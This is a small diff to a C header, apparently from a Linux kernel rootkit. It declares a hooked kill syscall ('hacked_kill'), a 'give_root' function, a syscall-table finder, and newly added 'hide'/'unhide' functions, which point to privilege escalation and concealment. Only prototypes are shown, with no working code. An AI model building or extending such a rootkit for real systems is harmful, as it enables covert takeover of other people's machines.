@@ -11,6 +11,9 @@ asmlinkage int hacked_kill(pid_t pid, int sig);
 
 void give_root(void);
 
+void hide(void);
+void unhide(void);
+
 void **find_syscall_table(void);
 
 #endif
